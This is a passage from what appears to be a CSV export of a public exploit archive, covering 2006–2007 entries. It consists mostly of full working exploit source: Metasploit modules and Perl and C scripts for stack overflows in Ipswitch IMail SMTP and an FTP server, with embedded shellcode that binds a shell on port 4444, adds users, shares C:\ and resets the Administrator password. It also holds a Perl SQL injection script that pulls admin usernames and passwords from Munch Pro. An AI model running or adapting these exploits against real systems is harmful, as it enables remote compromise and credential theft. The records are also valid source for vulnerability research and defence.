$request .= $shellcode;
my $s = Msf::Socket::Tcp->new
'PeerAddr'  => $target_host,
'PeerPort'  => $target_port,
'LocalPort' => $self->GetVar('CPORT'),
'SSL'       => $self->GetVar('SSL'),
if ($s->IsError) {
$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
return;
my $r = $s->RecvLineMulti(20);
if (! $r) { $self->PrintLine(""[*] No response from FTP server""); return; }
$self->Print($r);
$s->Send(""USER "".$self->GetVar('USER').""\n"");
$r = $s->RecvLineMulti(10);
if (! $r) { $self->PrintLine(""[*] No response from FTP server""); return; }
$self->Print($r);
$s->Send(""PASS "".$self->GetVar('PASS').""\n"");
$r = $s->RecvLineMulti(10);
if (! $r) { $self->PrintLine(""[*] No response from FTP server""); return; }
$self->Print($r);
$self->PrintLine(""[*] Attemping to exploit target '"".$target->[0].""'..."");
$s->Send(""XMD5 $request\n"");
$r = $s->RecvLineMulti(10);
if (! $r) { $self->PrintLine(""[*] No response from FTP server""); return; }
$self->Print($r);
sleep(2);
return;"
2007-02-04,Remote,Windows,Jacopo Cervini,Ipswitch IMail Server 8.10-8.12,RCPT TO Remote Buffer Overflow (Metasploit),"# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
# milw0rm.com [2007-02-04]","package Msf::Exploit::imail_smtp_rcpt_overflow;
use base ""Msf::Exploit"";
use strict;
use Pex::Text;
my $advanced = { };
my $info = {
'Name'    => 'IMail 2006 and 8.x SMTP Stack Overflow Exploit',
'Version'  => '$Revision: 1.0 $',
'Authors' => [ 'Jacopo Cervini <acaro [at] jervus.it>', ],
'Arch'    => [ 'x86' ],
'OS'      => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
'Priv'    => 1,
'UserOpts'  =>
'RHOST' => [1, 'ADDR', 'The target address'],
'RPORT' => [1, 'PORT', 'The target port', 25],
'Encoder'   => [1, 'EncodedPayload', 'Use Pex!!'],
'AutoOpts'  => { 'EXITFUNC'  => 'seh' },
'Payload' =>
'Space'     => 400,
'BadChars'  => ""\x00\x0d\x0a\x20\x3e\x22\x40"",
'Keys'      => ['+ws2ord'],
'Description'  => Pex::Text::Freeform(qq{
This module exploits a stack based buffer overflow in IMail 2006 and 8.x SMTP service.
If we send a long strings for RCPT TO command contained within the characters '@' and ':'
we can overwrite the eip register and exploit the vulnerable smpt service
'Refs'  =>
['BID', '19885'],
['CVE', '2006-4379'],
['URL',   'http://www.zerodayinitiative.com/advisories/ZDI-06-028.html'],
'Targets' =>
['Universal IMail 8.10',0x100188c3 ], # pop eax, ret in SmtpDLL.dll for IMail 8.10
['Universal IMail 8.12',0x100191c4 ], # pop eax, ret in SmtpDLL.dll for IMail 8.12
'DefaultTarget' => 0,
'Keys' => ['smtp'],
'DisclosureDate' => 'September 7 2006',
sub new {
my $class = shift;
my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
return($self);
sub Exploit {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $target_idx  = $self->GetVar('TARGET');
my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
my $target = $self->Targets->[$target_idx];
my $ehlo = ""EHLO "" . ""\r\n"";
my $mail_from = ""MAIL FROM:"" . ""\x20"" . ""\x3c"".""acaro"". ""\x40"".""jervus.it"" . ""\x3e"" . ""\r\n"";
my $pattern = ""\x20\x3c\x40"";
$pattern .= pack('V', $target->[1]);
$pattern .=""\x3a"" . $self->MakeNops((0x1e8-length ($shellcode)));
$pattern .= $shellcode;
$pattern .= ""\x4a\x61\x63\x3e"";
my $request = ""RCPT TO: "" . $pattern .""\n"";
$self->PrintLine(sprintf (""[*] Trying "".$target->[0]."" using pop eax, ret at 0x%.8x..."", $target->[1]));
my $s = Msf::Socket::Tcp->new
'PeerAddr'  => $target_host,
'PeerPort'  => $target_port,
'LocalPort' => $self->GetVar('CPORT'),
'SSL'       => $self->GetVar('SSL'),
if ($s->IsError) {
$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
return;
my $r = $s->Recv(-1, 5);
$s->Send($ehlo);
$self->PrintLine(""[*] I'm sending ehlo command"");
$self->PrintLine(""[*] $r"");
sleep(2);
$s->Send($mail_from);
$self->PrintLine(""[*] I'm sending mail from command"");
$r = $s->Recv(-1, 10);
$self->PrintLine(""[*] $r"");
sleep(2);
$s->Send($request);
$self->PrintLine(""[*] I'm sending rcpt to command"");
sleep(2);
return;"
2007-02-04,Remote,Windows,Jacopo Cervini,Ipswitch IMail Server 8.10-8.12,RCPT TO Remote Buffer Overflow,"#!/usr/bin/perl
# http://www.zerodayinitiative.com/advisories/ZDI-06-028.html
# https://www.securityfocus.com/bid/19885
# acaro [at] jervus.it
# win32_bind -  EXITFUNC=seh LPORT=4444
# milw0rm.com [2007-02-04]","use IO::Socket::INET;
use Switch;
if (@ARGV < 3) {
print ""--------------------------------------------------------------------\n"";
print ""Usage : Imail-rcpt-overflow.pl -hTargetIPAddress -oTargetReturnAddress\n"";
print "" Return address: \n"";
print "" o1 - IMail 8.12 Version\n"";
print "" o2 - IMail 8.10 Versio\n"";
print "" Example for IMail 8.12 Version: ./Imail-rcpt-overflow.pl -h127.0.0.1 -o1 \n"";
print ""--------------------------------------------------------------------\n"";
use IO::Socket::INET;
my $host = 10.0.0.2;
my $port = 25;
my $reply;
my $request;
my $happystack=""\x81\xc4\xff\xef\xff\xff\x44"";
foreach (@ARGV) {
$host = $1 if ($_=~/-h((.*)\.(.*)\.(.*)\.(.*))/);
$eip = $1 if ($_=~/-o(.*)/);
switch ($eip) {
case 1 { $eip=""\xc4\x91\x01\x10"" } # pop eax ret in SmtpDLL.dll for IMail 8.12
case 2 { $eip=""\xc3\x88\x01\x10"" } # pop eax ret in SmtpDLL.dll for IMail 8.10
my $shellcode  = ""\x33\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x93"".
""\x7b\xbd\x36\x83\xee\xfc\xe2\xf4\x6f\x11\x56\x7b\x7b\x82\x42\xc9"".
""\x6c\x1b\x36\x5a\xb7\x5f\x36\x73\xaf\xf0\xc1\x33\xeb\x7a\x52\xbd"".
""\xdc\x63\x36\x69\xb3\x7a\x56\x7f\x18\x4f\x36\x37\x7d\x4a\x7d\xaf"".
""\x3f\xff\x7d\x42\x94\xba\x77\x3b\x92\xb9\x56\xc2\xa8\x2f\x99\x1e"".
""\xe6\x9e\x36\x69\xb7\x7a\x56\x50\x18\x77\xf6\xbd\xcc\x67\xbc\xdd"".
""\x90\x57\x36\xbf\xff\x5f\xa1\x57\x50\x4a\x66\x52\x18\x38\x8d\xbd"".
""\xd3\x77\x36\x46\x8f\xd6\x36\x76\x9b\x25\xd5\xb8\xdd\x75\x51\x66"".
""\x6c\xad\xdb\x65\xf5\x13\x8e\x04\xfb\x0c\xce\x04\xcc\x2f\x42\xe6"".
""\xfb\xb0\x50\xca\xa8\x2b\x42\xe0\xcc\xf2\x58\x50\x12\x96\xb5\x34"".
""\xc6\x11\xbf\xc9\x43\x13\x64\x3f\x66\xd6\xea\xc9\x45\x28\xee\x65"".
""\xc0\x28\xfe\x65\xd0\x28\x42\xe6\xf5\x13\xac\x6a\xf5\x28\x34\xd7"".
""\x06\x13\x19\x2c\xe3\xbc\xea\xc9\x45\x11\xad\x67\xc6\x84\x6d\x5e"".
""\x37\xd6\x93\xdf\xc4\x84\x6b\x65\xc6\x84\x6d\x5e\x76\x32\x3b\x7f"".
""\xc4\x84\x6b\x66\xc7\x2f\xe8\xc9\x43\xe8\xd5\xd1\xea\xbd\xc4\x61"".
""\x6c\xad\xe8\xc9\x43\x1d\xd7\x52\xf5\x13\xde\x5b\x1a\x9e\xd7\x66"".
""\xca\x52\x71\xbf\x74\x11\xf9\xbf\x71\x4a\x7d\xc5\x39\x85\xff\x1b"".
""\x6d\x39\x91\xa5\x1e\x01\x85\x9d\x38\xd0\xd5\x44\x6d\xc8\xab\xc9"".
""\xe6\x3f\x42\xe0\xc8\x2c\xef\x67\xc2\x2a\xd7\x37\xc2\x2a\xe8\x67"".
""\x6c\xab\xd5\x9b\x4a\x7e\x73\x65\x6c\xad\xd7\xc9\x6c\x4c\x42\xe6"".
""\x18\x2c\x41\xb5\x57\x1f\x42\xe0\xc1\x84\x6d\x5e\x63\xf1\xb9\x69"".
""\xc0\x84\x6b\xc9\x43\x7b\xbd\x36"";
my $nop=""\x41""x137;
my $buffer = ""RCPT TO:"".""\x20\x3c\x40"".$eip . ""\x3a"" .$nop.$happystack.$shellcode.""\x4a\x61\x63\x3e"".""\n"";
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die ""Cannot connect to host!\n"";
recv($socket, $reply, 1024, 0);
print ""Response:"" . $reply;
$request = ""EHLO "" . ""\r\n"";
send $socket, $request, 0;
print ""[+] Sent  EHLO\n"";
recv($socket, $reply, 1024, 0);
print ""Response:"" . $reply;
$request = ""MAIL FROM:"" . ""\x20"" . ""\x3c"".""acaro"". ""\x40"".""jervus.it"" . ""\x3e"" . ""\r\n"";
send $socket, $request, 0;
print ""[+] Sent  MAIL FROM\n"";
recv($socket, $reply, 1024, 0);
print ""Response:"" . $reply;
$request = $buffer;
send $socket, $request, 0;
print ""[+] Sent malicius request\n"";
close $socket;
print "" + connect on port 4444 of $host ...\n"";
sleep(3);
system(""telnet $host 4444"");
exit;"
2006-11-12,WebApps,ASP,ajann,Munch Pro 1.0,'switch.asp' SQL Injection,"#!/usr/bin/perl
#[Script Name: Munch Pro 1.0 (switch.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
#Local variables
#Writing data to socket
#Getting
# milw0rm.com [2006-11-12]","use IO::Socket;
if(@ARGV < 3){
print ""
[//    Munch Pro 1.0 (switch.asp) Remote SQL Injection Exploit
[//           Usage: exploit.pl [target] [path] [userid]
[//                   Example: exploit.pl victim.com / 1
[//                   Example: exploit.pl victim.com /path/ 1
[//                           Vuln&Exp : ajann
exit();
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = ""http://"".$server;
$port = ""80"";
$dir = $ARGV[1];
$file = ""switch.asp?pg=subMenu&catid="";
$target = ""-1%20union%20select%200,0,username,0,password,0%20from%20users%20where%20id%20like%20"".$ARGV[2];
$target = $host.$dir.$file.$target;
print ""+**********************************************************************+\n"";
print ""+ Trying to connect: $server\n"";
$socket = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""$port"") || die ""\n+ Connection failed...\n"";
print $socket ""GET $target\n"";
print $socket ""Host: $server\n"";
print $socket ""Accept: */*\n"";
print $socket ""Connection: close\n\n"";
print ""+ Connected!...\n"";
while($answer = <$socket>) {
if ($answer =~ /74%\""><font color=\""#000000\""><strong>(.*?)<\/strong><br>/){
print ""+ Exploit succeed! Getting admin information.\n"";
print ""+ ---------------- +\n"";
print ""+ Username: $1\n"";
if ($answer =~ /17%\"" align=\""center\""><Font Color=\""#000000\""><strong>(.*?)<\/strong><\/Font><\/TD>/){
print ""+ Password: $1\n"";
exit();
if ($answer =~ /Under Construction, Please check back soon.../) {
print ""+ Exploit Failed : ( \n"";
print ""+**********************************************************************+\n"";
exit();
if ($answer =~ /Internal Server Error/) {
print ""+ Exploit Failed : (  \n"";
print ""+**********************************************************************+\n"";
exit();
print ""+ Exploit failed :(\n"";
print ""+**********************************************************************+\n"";"
2006-10-19,Remote,Windows,Greg Linares,Ipswitch IMail Server 2006 / 8.x,'RCPT' Remote Stack Overflow,"// IMail 2006 and 8.x SMTP Stack Overflow Exploit
// coded by Greg Linares [glinares.code[at]gmail[dot]com
// http://www.juniper.net/security/auto/vulnerabilities/vuln3414.html
// This works on the following versions:
// 2006 IMail prior to 2006.1 update
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#pragma comment(lib,""wsock32.lib"")
// PAYLOADS
// Restricted Chars = 0x00 0x0D 0x0A 0x20 0x3e 0x22 (Maybe More)
/* win32_exec -  EXITFUNC=seh CMD=net share Export=C:\ /unlimited Size=188 Encoder=ShikataGaNai http://metasploit.com */
/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=Pex http://metasploit.com */
/* win32_adduser -  PASS=Error EXITFUNC=seh USER=Error Size=236 Encoder=PexFnstenvSub http://metasploit.com */
/* win32_exec -  CMD=net user Administrator ""p@ssw0rd"" Size=187 Encoder=Pex http://metasploit.com */
/* wait for SMTP service welcome*/
// JMP to EAX = Results in a Corrupted Stack
// so instead we POP EBP, RET to restore pointer and then return
// this causes code procedure to continue
// Another overflow can be achieved by using an overly long buffer after RCPT TO: on 8.15 systems
// After around 560 bytes or so EIP gets overwritten.  But this method is easier to exploit and it works
// On all versions from 8.x to 2006 (9.x?)
// Setup Payload Options
// Dont forget to add the trailing characters to set up stack overflow
// Connect to SMTP Server and Setup Up Email
/* wait for SMTP service welcome*/
// milw0rm.com [2006-10-19]","int main(int argc, char *argv[])
static char overflow[1028];
unsigned char RootShare[] =
""\xdb\xcb\x29\xc9\xba\xfa\xef\x47\x2b\xb1\x2a\xd9\x74\x24\xf4\x58""
""\x31\x50\x17\x83\xc0\x04\x03\xaa\xfc\xa5\xde\xb6\xeb\x6e\x21\x46""
""\xec\xe5\x64\x7a\x67\x85\x63\xfa\x76\x99\xe7\xb5\x60\xee\xa7\x69""
""\x90\x1b\x1e\xe2\xa6\x50\xa0\x1a\xf7\xa6\x3a\x4e\x7c\xe6\x49\x89""
""\xbc\x2d\xbc\x94\xfc\x59\x4b\xad\x54\xba\xb0\xa4\xb1\x49\xe7\x62""
""\x3b\xa5\x7e\xe1\x37\x72\xf4\xaa\x5b\x85\xe1\xdf\x78\x0e\xf4\x34""
""\x09\x4c\xd3\xce\xc9\x5c\xdb\xaa\x46\xde\xeb\xb7\x99\xa7\x07\x3c""
""\x59\x54\x93\x32\x46\xc9\x28\xda\x7e\xfa\x26\x91\xff\x4c\x38\xa5""
""\xff\x27\x51\x99\xa0\x06\x54\x81\x08\xe0\x60\xc2\x75\x89\xc0\xac""
""\x85\xe4\xe5\x73\x0e\x61\x1b\x01\xc0\xc6\x1b\xf2\xb3\x8d\x97\xdc""
""\x38\x26\x39\x6e\xda\x96\xfc\xf6\x54\xb8\x8c\x72\xa8\x05\x4b\x26""
""\xf2\xa6\xde\xb8\x9e\xd1\x4d\x2d\x2b\x47\xea\xad"";
unsigned char Win32Bind[] =
""\x33\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x93""
""\x7b\xbd\x36\x83\xee\xfc\xe2\xf4\x6f\x11\x56\x7b\x7b\x82\x42\xc9""
""\x6c\x1b\x36\x5a\xb7\x5f\x36\x73\xaf\xf0\xc1\x33\xeb\x7a\x52\xbd""
""\xdc\x63\x36\x69\xb3\x7a\x56\x7f\x18\x4f\x36\x37\x7d\x4a\x7d\xaf""
""\x3f\xff\x7d\x42\x94\xba\x77\x3b\x92\xb9\x56\xc2\xa8\x2f\x99\x1e""
""\xe6\x9e\x36\x69\xb7\x7a\x56\x50\x18\x77\xf6\xbd\xcc\x67\xbc\xdd""
""\x90\x57\x36\xbf\xff\x5f\xa1\x57\x50\x4a\x66\x52\x18\x38\x8d\xbd""
""\xd3\x77\x36\x46\x8f\xd6\x36\x76\x9b\x25\xd5\xb8\xdd\x75\x51\x66""
""\x6c\xad\xdb\x65\xf5\x13\x8e\x04\xfb\x0c\xce\x04\xcc\x2f\x42\xe6""
""\xfb\xb0\x50\xca\xa8\x2b\x42\xe0\xcc\xf2\x58\x50\x12\x96\xb5\x34""
""\xc6\x11\xbf\xc9\x43\x13\x64\x3f\x66\xd6\xea\xc9\x45\x28\xee\x65""
""\xc0\x28\xfe\x65\xd0\x28\x42\xe6\xf5\x13\xac\x6a\xf5\x28\x34\xd7""
""\x06\x13\x19\x2c\xe3\xbc\xea\xc9\x45\x11\xad\x67\xc6\x84\x6d\x5e""
""\x37\xd6\x93\xdf\xc4\x84\x6b\x65\xc6\x84\x6d\x5e\x76\x32\x3b\x7f""
""\xc4\x84\x6b\x66\xc7\x2f\xe8\xc9\x43\xe8\xd5\xd1\xea\xbd\xc4\x61""
""\x6c\xad\xe8\xc9\x43\x1d\xd7\x52\xf5\x13\xde\x5b\x1a\x9e\xd7\x66""
""\xca\x52\x71\xbf\x74\x11\xf9\xbf\x71\x4a\x7d\xc5\x39\x85\xff\x1b""
""\x6d\x39\x91\xa5\x1e\x01\x85\x9d\x38\xd0\xd5\x44\x6d\xc8\xab\xc9""
""\xe6\x3f\x42\xe0\xc8\x2c\xef\x67\xc2\x2a\xd7\x37\xc2\x2a\xe8\x67""
""\x6c\xab\xd5\x9b\x4a\x7e\x73\x65\x6c\xad\xd7\xc9\x6c\x4c\x42\xe6""
""\x18\x2c\x41\xb5\x57\x1f\x42\xe0\xc1\x84\x6d\x5e\x63\xf1\xb9\x69""
""\xc0\x84\x6b\xc9\x43\x7b\xbd\x36"";
unsigned char AddUser[] =
""\x2b\xc9\x83\xe9\xcb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb2""
""\xe6\xaf\x6a\x83\xeb\xfc\xe2\xf4\x4e\x0e\xeb\x6a\xb2\xe6\x24\x2f""
""\x8e\x6d\xd3\x6f\xca\xe7\x40\xe1\xfd\xfe\x24\x35\x92\xe7\x44\x23""
""\x39\xd2\x24\x6b\x5c\xd7\x6f\xf3\x1e\x62\x6f\x1e\xb5\x27\x65\x67""
""\xb3\x24\x44\x9e\x89\xb2\x8b\x6e\xc7\x03\x24\x35\x96\xe7\x44\x0c""
""\x39\xea\xe4\xe1\xed\xfa\xae\x81\x39\xfa\x24\x6b\x59\x6f\xf3\x4e""
""\xb6\x25\x9e\xaa\xd6\x6d\xef\x5a\x37\x26\xd7\x66\x39\xa6\xa3\xe1""
""\xc2\xfa\x02\xe1\xda\xee\x44\x63\x39\x66\x1f\x6a\xb2\xe6\x24\x02""
""\x8e\xb9\x9e\x9c\xd2\xb0\x26\x92\x31\x26\xd4\x3a\xda\x16\x25\x6e""
""\xed\x8e\x37\x94\x38\xe8\xf8\x95\x55\x85\xc2\x0e\x9c\x83\xd7\x0f""
""\x92\xc9\xcc\x4a\xdc\x83\xdb\x4a\xc7\x95\xca\x18\x92\xa3\xdd\x18""
""\xdd\x94\x8f\x2f\xc0\x94\xc0\x18\x92\xc9\xee\x2e\xf6\xc6\x89\x4c""
""\x92\x88\xca\x1e\x92\x8a\xc0\x09\xd3\x8a\xc8\x18\xdd\x93\xdf\x4a""
""\xf3\x82\xc2\x03\xdc\x8f\xdc\x1e\xc0\x87\xdb\x05\xc0\x95\x8f\x2f""
""\xc0\x94\xc0\x18\x92\xc9\xee\x2e\xf6\xe6\xaf\x6a"";
unsigned char ChangeAdmin[] =
""\x29\xc9\x83\xe9\xda\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x74""
""\xb8\x4f\xba\x83\xee\xfc\xe2\xf4\x88\x50\x0b\xba\x74\xb8\xc4\xff""
""\x48\x33\x33\xbf\x0c\xb9\xa0\x31\x3b\xa0\xc4\xe5\x54\xb9\xa4\xf3""
""\xff\x8c\xc4\xbb\x9a\x89\x8f\x23\xd8\x3c\x8f\xce\x73\x79\x85\xb7""
""\x75\x7a\xa4\x4e\x4f\xec\x6b\xbe\x01\x5d\xc4\xe5\x50\xb9\xa4\xdc""
""\xff\xb4\x04\x31\x2b\xa4\x4e\x51\xff\xa4\xc4\xbb\x9f\x31\x13\x9e""
""\x70\x7b\x7e\x7a\x10\x33\x0f\x8a\xf1\x78\x37\xb6\xff\xf8\x43\x31""
""\x04\xa4\xe2\x31\x1c\xb0\xa4\xb3\xff\x38\xff\xba\x74\xb8\xc4\xd2""
""\x48\xe7\x7e\x4c\x14\xee\xc6\x42\xf7\x78\x34\xea\x1c\x48\xc5\xbe""
""\x2b\xd0\xd7\x44\xfe\xb6\x18\x45\x93\xd6\x2a\xce\x54\xcd\x3c\xdf""
""\x06\x98\x0b\xc8\x15\xd3\x2a\x9a\x5b\xd9\x2b\xde\x74\xb8\x4f\xba"";
WSADATA wsaData;
struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check;
int sockfd, bytes;
int plen, i, JMP;
char *hostname;
unsigned short port;
printf(""IMail 2006 and 8.x SMTP 'RCPT TO:' Stack Overflow Exploit\n"");
printf(""Coded by Greg Linares < glinares.code  [at] GMAIL [dot] com >\n"");
if (argc <= 1)
printf(""Usage: %s [hostname] [port] <Payload> <JMP>\n"", argv[0]);
printf(""Default port is 25 \r\n"");
printf(""==============================\n"");
printf(""Payload Options: 1 = Default\n"");
printf(""==============================\n"");
printf(""1 = Share C:\\ as 'Export' Share\n"");
printf(""2 = Add User 'Error' with Password 'Error'\n"");
printf(""3 = Win32 Bind CMD to Port 4444\n"");
printf(""4 = Change Administrator Password to 'p@ssw0rd'\n"");
printf(""==============================\n"");
printf(""JMP Options: 1 = Default\n"");
printf(""==============================\n"");
printf(""1 = IMAIL 8.x SMTPDLL.DLL   [pop ebp, ret] 0x10036f71 \n"");
printf(""2 = Win2003 SP1 English NTDLL.DLL [pop ebp, ret] 0x7c87d8af \n"");
printf(""3 = Win2003 SP0 English USER32.DLL [pop ebp, ret] 0x77d02289 \n"");
printf(""4 = WinXP SP2 English NTDLL.DLL [pop ebp, ret] 0x7c967e23 \n"");
printf(""5 = WinXP SP1 - SP0 English USER32.DLL [pop ebp, ret] 0x71ab389c \n"");
printf(""6 = Win2000 Universal English USER32.DLL [pop ebp, ret] 0x75021397 \n"");
printf(""7 = Win2000 Universal French USER32.DLL [pop ebp, ret] 0x74fa1397 \n"");
printf(""8 = Windows XP SP1 - SP2 German USER32.DLL [pop ebp, ret] 0x77d18c14 \r\n"");
exit(0);
hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi(""25"");
if (argv[4]) JMP = atoi(argv[4]);
else JMP = atoi(""1"");
if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
fprintf(stderr, ""Error setting up with WinSock v1.1\n"");
exit(-1);
hp = gethostbyname(hostname);
if (hp == NULL)
printf(""ERROR: Uknown host %s\n"", hostname);
printf(""%s"",hostname);
exit(-1);
sockin.sin_family = hp->h_addrtype;
sockin.sin_port = htons(port);
sockin.sin_addr = *((struct in_addr *)hp->h_addr);
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
printf(""ERROR: Socket Error\n"");
exit(-1);
if ((connect(sockfd, (struct sockaddr *) &sockin,
sizeof(sockin))) == SOCKET_ERROR)
printf(""ERROR: Connect Error\n"");
closesocket(sockfd);
WSACleanup();
exit(-1);
printf(""Connected to [%s] on port [%d], sending overflow....\n"",
hostname, port);
if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
printf(""ERROR: Recv Error\n"");
closesocket(sockfd);
WSACleanup();
exit(1);
buf[bytes] = '\0';
check = strstr(buf, ""220"");
if (check == NULL)
printf(""ERROR: NO  response from SMTP service\n"");
closesocket(sockfd);
WSACleanup();
exit(-1);
['IMail 8.x Universal', 0x10036f71 ],
['Windows 2003 SP1 English', 0x7c87d8af ],
['Windows 2003 SP0 English', 0x77d5c14c ],
['Windows XP SP2 English', 0x7c967e23 ],
['Windows XP SP1 English', 0x71ab389c ],
['Windows XP SP0 English', 0x71ab389c ],
['Windows 2000 Universal English', 0x75021397 ],
['Windows 2000 Universal French', 0x74fa1397],
['Windows XP SP1 - SP2 German', 0x77d18c14],
char Exp[] = ""RCPT TO: <@"";// This stores our JMP between the @ and :
char Win2k3SP1E[] = ""\xaf\xd8\x87\x7c:"";//Win2k3 SP1 English NTDLL.DLL [pop ebp, ret] 0x7c87d8af
char WinXPSP2E[] = ""\x23\x7e\x96\x7c:"";//WinXP SP2 English  NTDLL.DLL [pop ebp, ret] 0x7c967e23
char IMail815[] = ""\x71\x6f\x03\x10:""; //IMAIL 8.15 SMTPDLL.DLL   [pop ebp, ret] 0x10036f71
char Win2k3SP0E[] = ""\x4c\xc1\xd5\x77:"";//Win2k3 SP0 English USER32.DLL [pop ebp, ret]0x77d5c14c
char WinXPSP2[] = ""\x23\x7e\x96\x7c:"";//WinXP SP2 English USER32.DLL [pop ebp, ret] 0x7c967e23
char WinXPSP1[] = ""\x9c\x38\xab\x71:"";//WinXP SP1 and 0 English U32[pop ebp, ret]0x71ab389c
char Win2KE[] = ""\x97\x31\x02\x75:"";//Win2k English All SPs[pop ebp, ret]0x75021397
char Win2KF[] = ""\x97\x13\xfa\x74:"";// As above except French Win2k[pop ebp, ret]0x74fa1397
char WinXPG[] = ""\x14\x8c\xd1\x77:"";//WinXP SP1 - SP2 German U32    [pop ebp, ret]0x77d18c14
char tail[] = ""SSS>\n"";// This closes the RCPT cmd.  Any characters work.
char StackS[] = ""\x81\xc4\xff\xef\xff\xff\x44"";// Stabolize Stack prior to payload.
memset(overflow, 0, 1028);
strcat(overflow, Exp);
if (JMP == 1)
printf(""Using IMail 8.15 SMTDP.DLL JMP\n"");
strcat(overflow, IMail815);
} else if (JMP == 2)
printf(""Using Win2003 SP1 NTDLL.DLL JMP\n"");
strcat(overflow, Win2k3SP1E);
} else if (JMP == 3)
printf(""Using Win2003 SP0 USER32.DLL JMP\n"");
strcat(overflow, Win2k3SP0E);
} else if (JMP == 4)
printf(""Using WinXP SP2 NTDLL.DLL JMP\n"");
strcat(overflow, WinXPSP2E);
} else if (JMP == 5)
printf(""Using WinXP SP1 and SP0 USER32.DLL JMP\n"");
strcat(overflow, WinXPSP1);
} else if (JMP == 6)
printf(""Using Win2000 Universal English USER32.DLL JMP\n"");
strcat(overflow, Win2KE);
} else if (JMP == 7)
printf(""Using Win2000 Universal French USER32.DLL JMP\n"");
strcat(overflow, Win2KF);
} else if (JMP == 8)
printf(""Using WinXP SP2 and SP1 German USER32.DLL JMP\n"");
strcat(overflow, WinXPG);
} else {
printf(""Using IMail 8.15 SMTDP.DLL JMP\n"");
strcat(overflow, IMail815);
if (atoi(argv[3]) == 1)
printf(""Using Root Share Payload\n"");
plen = 544 - ((strlen(RootShare) + strlen(StackS)));
for (i=0; i<plen; i++){
strcat(overflow, ""\x90"");
strcat(overflow, StackS);
strcat(overflow, RootShare);
} else if (atoi(argv[3]) == 2)
printf(""Using Add User Payload\n"");
plen = 544 - ((strlen(AddUser)+ strlen(StackS)));
for (i=0; i<plen; i++){
strcat(overflow, ""\x90"");
strcat(overflow, StackS);
strcat(overflow, AddUser);
} else if (atoi(argv[3]) == 3)
printf(""Using Win32 CMD Bind Payload\n"");
plen = 544 - ((strlen(Win32Bind) + strlen(StackS)));
for (i=0; i<plen; i++){
strcat(overflow, ""\x90"");
strcat(overflow, StackS);
strcat(overflow, Win32Bind);
} else if (atoi(argv[3]) == 4)
printf(""Using Change Admin Password Payload (Pwd = 'p@ssw0rd')\n"");
plen = 544 - ((strlen(ChangeAdmin) + strlen(StackS)));
for (i=0; i<plen; i++){
strcat(overflow, ""\x90"");
strcat(overflow, StackS);
strcat(overflow, ChangeAdmin);
} else
printf(""Using Win32 CMD Bind Payload\n"");
plen = 544 - ((strlen(Win32Bind) + strlen(StackS)));
for (i=0; i<plen; i++){
strcat(overflow, ""\x90"");
strcat(overflow, StackS);
strcat(overflow, Win32Bind);
strcat(overflow, tail);
char EHLO[] = ""EHLO \r\n"";
char MF[] = ""MAIL FROM <TEST@TEST> \r\n"";
send(sockfd, EHLO, strlen(EHLO), 0);
Sleep(1000);
send(sockfd, MF, strlen(MF), 0);
Sleep(1000);
if (send(sockfd, overflow, strlen(overflow),0) == SOCKET_ERROR)
printf(""ERROR: Send Error\n"");
closesocket(sockfd);
WSACleanup();
exit(-1);
printf(""Exploit Sent.....\r\n"");
if (atoi(argv[3]) == 3)
printf(""Check Shell on Port 4444\n"");
closesocket(sockfd);
WSACleanup();
exit(0);
printf(""Checking If Exploit Executed....\r\n"");
Sleep(1000);
closesocket(sockfd);
sockin.sin_family = hp->h_addrtype;
sockin.sin_port = htons(port);
sockin.sin_addr = *((struct in_addr *)hp->h_addr);
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
printf(""ERROR: Socket Error\n"");
exit(-1);
if ((connect(sockfd, (struct sockaddr *) &sockin,
sizeof(sockin))) == SOCKET_ERROR)
printf(""Exploit Successfully Delivered!\n"");
closesocket(sockfd);
WSACleanup();
printf(""Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!"");
exit(0);
printf(""..."");
if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
printf(""Exploit Successfully Delivered!\n"");
closesocket(sockfd);
WSACleanup();
printf(""Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!"");
exit(0);
buf[bytes] = '\0';
check = strstr(buf, ""220"");
if (check == NULL)
printf(""Exploit Successfully Delivered!\n"");
closesocket(sockfd);
WSACleanup();
printf(""Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!"");
exit(0);
printf(""Exploit Failed: Try A different JMP Method or Payload\n"");
closesocket(sockfd);
WSACleanup();
exit (1);"
2006-09-20,Remote,Windows,h07,Ipswitch WS_FTP LE 5.08,PASV Response Remote Buffer Overflow,"#include <winsock2.h>
#define PORT 21
#define BUFF_SIZE 1024
#define RESPONSE ""200 blah blah\r\n""
//PASV request
//PASV response
// milw0rm.com [2006-09-20]","ws_exp.c
WS_FTP LE 5.08 (PASV response) 0day buffer overflow exploit
Coded by h07 <h07@interia.pl>
Tested on XP SP2 Polish, 2000 SP4 Polish
Example:
